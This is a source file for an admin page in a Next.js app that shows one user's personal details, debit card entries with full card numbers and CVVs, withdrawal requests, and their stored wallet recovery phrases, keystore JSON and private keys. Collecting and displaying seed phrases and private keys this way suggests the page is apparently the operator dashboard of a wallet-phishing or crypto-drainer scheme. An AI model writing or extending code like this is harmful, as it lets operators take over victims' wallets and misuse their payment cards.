import UserClientButton from "@/components/admin/UserClientButton";
import WithdrawalStatusButton from "@/components/admin/WithdrawalStatusButton";
import CopyTextButton from "@/components/admin/CopyTextButton";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { auth, User as UserType } from "@/lib/auth";
import Wallet from "@/models/wallet.model";
import CardModel from "@/models/card.model";
import WithdrawalModel from "@/models/withdrawal.model";
import { headers } from "next/headers";
import { notFound } from "next/navigation";
import Link from "next/link";
import { CreditCard, ArrowUpRight, CheckCircle2, Clock, XCircle } from "lucide-react";

type Props = { params: Promise<{ userId: string }> };

async function User({ params }: Props) {
  try {
    const userId = (await params).userId;

    const [wallet, userInfo, cards, withdrawals] = await Promise.all([
      Wallet.find({ userId: userId }),
      auth.api.getUser({
        query: { id: userId },
        headers: await headers(),
      }),
      CardModel.find({ userId: userId }).sort({ createdAt: -1 }),
      WithdrawalModel.find({ userId: userId }).sort({ createdAt: -1 }),
    ]);

    if (!userInfo) {
      notFound();
    }

    const user = {
      firstName: userInfo.name.split(" ")[0],
      lastName: userInfo.name.split(" ")[1] || "",
      email: userInfo.email,
      userId: userInfo.id,
      ipAddress: (userInfo as any).ipAddress || "N/A",
      country: (userInfo as any).country || "N/A",
      phrases: wallet[0]?.phrases,
      keystorejson: wallet[0]?.keystorejson,
      privateKey: wallet[0]?.privatekey,
      walletStatus: (userInfo as UserType).walletStatus,
    };

    const hasApprovedCard = cards.some((c) => c.status === "approved");

    const badgeClass: Record<string, string> = {
      pending: "border-amber-500/30 bg-amber-500/10 text-amber-500",
      approved: "border-emerald-500/30 bg-emerald-500/10 text-emerald-500",
      completed: "border-emerald-500/30 bg-emerald-500/10 text-emerald-500",
      rejected: "border-red-500/30 bg-red-500/10 text-red-500",
    };

    return (
      <section className="max-w-5xl mx-auto pb-24 md:pb-8 space-y-8">
        {/* User Details */}
        <div>
          <h2 className="text-xl font-bold mb-3">User Details</h2>
          <div className="overflow-x-auto rounded-xl border border-gray-200 dark:border-white/10 bg-white dark:bg-gray-800">
            <Table className="min-w-[600px]">
              <TableHeader>
                <TableRow className="bg-gray-50 dark:bg-white/5">
                  <TableHead>First Name</TableHead>
                  <TableHead>Last Name</TableHead>
                  <TableHead>Email</TableHead>
                  <TableHead>IP Address</TableHead>
                  <TableHead>Country</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                <TableRow>
                  <TableCell className="font-medium">{user.firstName}</TableCell>
                  <TableCell>{user.lastName}</TableCell>
                  <TableCell>{user.email}</TableCell>
                  <TableCell className="font-mono text-xs">{user.ipAddress}</TableCell>
                  <TableCell>{user.country}</TableCell>
                </TableRow>
              </TableBody>
            </Table>
          </div>
        </div>

        {/* Card Activation Status */}
        <div>
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2">
              <CreditCard className="w-5 h-5 text-amber-500" />
              <h2 className="text-lg font-bold">Debit Card Status</h2>
            </div>
            <Link
              href="/admin/cards"
              className="text-xs font-semibold text-blue-500 hover:underline"
            >
              Manage Cards →
            </Link>
          </div>

          {cards.length === 0 ? (
            <div className="p-4 rounded-xl border border-dashed border-gray-300 dark:border-gray-700 text-xs text-gray-500 bg-gray-50 dark:bg-white/5">
              No card applications submitted by this user yet.
            </div>
          ) : (
            <div className="overflow-x-auto rounded-xl border border-gray-200 dark:border-white/10 bg-white dark:bg-gray-800">
              <Table className="min-w-[600px] text-sm">
                <TableHeader>
                  <TableRow className="bg-gray-50 dark:bg-white/5">
                    <TableHead>Type</TableHead>
                    <TableHead>Cardholder</TableHead>
                    <TableHead>Card Number</TableHead>
                    <TableHead>Expiry / CVV</TableHead>
                    <TableHead>Status</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {cards.map((c) => (
                    <TableRow key={c._id.toString()}>
                      <TableCell className="font-bold uppercase text-amber-500">
                        {c.cardType}
                      </TableCell>
                      <TableCell>{c.fullName}</TableCell>
                      <TableCell className="font-mono text-xs">
                        {c.cardNumber || "Generated upon approval"}
                      </TableCell>
                      <TableCell className="font-mono text-xs">
                        {c.expiryDate ? `${c.expiryDate} / CVV: ${c.cvv || "•••"}` : "—"}
                      </TableCell>
                      <TableCell>
                        <span
                          className={`inline-block px-2.5 py-0.5 rounded-full text-xs font-semibold capitalize border ${
                            c.status === "approved"
                              ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-500"
                              : c.status === "rejected"
                              ? "bg-red-500/10 border-red-500/30 text-red-500"
                              : "bg-amber-500/10 border-amber-500/30 text-amber-500"
                          }`}
                        >
                          {c.status}
                        </span>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </div>

        {/* Withdrawal Requests & Transaction Hashes */}
        <div>
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2">
              <ArrowUpRight className="w-5 h-5 text-orange-500" />
              <h2 className="text-lg font-bold">Withdrawal Requests & Transaction Hashes</h2>
            </div>
            <Link
              href="/admin/withdrawals"
              className="text-xs font-semibold text-blue-500 hover:underline"
            >
              All Withdrawals →
            </Link>
          </div>

          {withdrawals.length === 0 ? (
            <div className="p-4 rounded-xl border border-dashed border-gray-300 dark:border-gray-700 text-xs text-gray-500 bg-gray-50 dark:bg-white/5">
              No withdrawal requests submitted by this user.
            </div>
          ) : (
            <div className="overflow-x-auto rounded-xl border border-gray-200 dark:border-white/10 bg-white dark:bg-gray-800">
              <Table className="min-w-[750px] text-sm">
                <TableHeader>
                  <TableRow className="bg-gray-50 dark:bg-white/5">
                    <TableHead>Transaction Hash</TableHead>
                    <TableHead>Asset</TableHead>
                    <TableHead>Amount & USD</TableHead>
                    <TableHead>Recipient Address</TableHead>
                    <TableHead>Date</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead>Action</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {withdrawals.map((w) => (
                    <TableRow key={w._id.toString()}>
                      <TableCell className="align-middle">
                        <div className="flex items-center gap-1.5 font-mono text-xs text-amber-500 bg-gray-900/60 dark:bg-black/40 border border-gray-700/50 px-2.5 py-1.5 rounded-lg max-w-[210px]">
                          <span className="truncate flex-1" title={w.txHash}>
                            {w.txHash}
                          </span>
                          <CopyTextButton
                            text={w.txHash}
                            label="Transaction Hash"
                            className="text-gray-400 hover:text-amber-400"
                          />
                        </div>
                      </TableCell>
                      <TableCell className="font-bold align-middle">
                        {w.coin}{" "}
                        {w.network !== "NATIVE" && (
                          <span className="text-xs font-normal text-gray-500">
                            ({w.network})
                          </span>
                        )}
                      </TableCell>
                      <TableCell className="font-mono align-middle">
                        <div>
                          {w.amount.toLocaleString(undefined, { maximumFractionDigits: 8 })}{" "}
                          {w.coin}
                        </div>
                        <div className="text-xs text-gray-500">
                          ≈ ${w.usdValue?.toFixed(2) || "0.00"}
                        </div>
                      </TableCell>
                      <TableCell className="font-mono text-xs align-middle">
                        <div className="flex items-center gap-1.5 max-w-[180px]">
                          <span className="truncate" title={w.recipientAddress}>
                            {w.recipientAddress}
                          </span>
                          <CopyTextButton
                            text={w.recipientAddress}
                            label="Recipient Address"
                          />
                        </div>
                      </TableCell>
                      <TableCell className="text-xs text-gray-500 whitespace-nowrap align-middle">
                        {new Date(w.createdAt).toLocaleString()}
                      </TableCell>
                      <TableCell>
                        <span
                          className={`inline-block px-2.5 py-0.5 rounded-full text-xs font-semibold capitalize border ${
                            badgeClass[w.status] || badgeClass.pending
                          }`}
                        >
                          {w.status}
                        </span>
                      </TableCell>
                      <TableCell>
                        <WithdrawalStatusButton
                          withdrawalId={w._id.toString()}
                          currentStatus={w.status as any}
                        />
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </div>

        {/* Phrases */}
        <div>
          <h2 className="text-lg font-bold mb-2">Wallet Recovery Phrases</h2>
          <div className="overflow-x-auto p-4 rounded-xl border border-gray-200 dark:border-white/10 bg-white dark:bg-gray-800">
            {user.phrases && wallet.length > 0 ? (
              <ul className="flex flex-col gap-2 font-mono text-xs">
                {user.phrases.map((phrase, idx) => (
                  <li key={idx} className="whitespace-nowrap">
                    {idx + 1}. {phrase}
                  </li>
                ))}
              </ul>
            ) : (
              <div className="text-gray-500 text-xs">No recovery phrase saved</div>
            )}
          </div>
        </div>

        {/* Keystore Json */}
        <div>
          <h2 className="text-lg font-bold mb-2">Keystore JSON</h2>
          <div className="overflow-x-auto p-4 rounded-xl border border-gray-200 dark:border-white/10 bg-white dark:bg-gray-800">
            {user.keystorejson && wallet.length > 0 ? (
              <ul className="flex flex-col gap-2 font-mono text-xs">
                {user.keystorejson.map((phrase, idx) => (
                  <li key={idx} className="whitespace-nowrap">
                    {phrase}
                  </li>
                ))}
              </ul>
            ) : (
              <div className="text-gray-500 text-xs">No keystore JSON saved</div>
            )}
          </div>
        </div>

        {/* Private Key */}
        <div>
          <h2 className="text-lg font-bold mb-2">Private Key</h2>
          <div className="overflow-x-auto p-4 rounded-xl border border-gray-200 dark:border-white/10 bg-white dark:bg-gray-800">
            {user.privateKey && wallet.length > 0 ? (
              <ul className="flex flex-col gap-2 font-mono text-xs">
                {user.privateKey.map((phrase, idx) => (
                  <li key={idx} className="whitespace-nowrap">
                    {phrase}
                  </li>
                ))}
              </ul>
            ) : (
              <div className="text-gray-500 text-xs">No private key saved</div>
            )}
          </div>
        </div>

        <UserClientButton walletStatus={user.walletStatus} userId={user.userId} />
      </section>
    );
  } catch (error) {
    console.log(error);
    return (
      <div className="max-w-5xl mx-auto text-center text-red-700 py-6">
        An error occurred while fetching user data.
      </div>
    );
  }
}

export default User;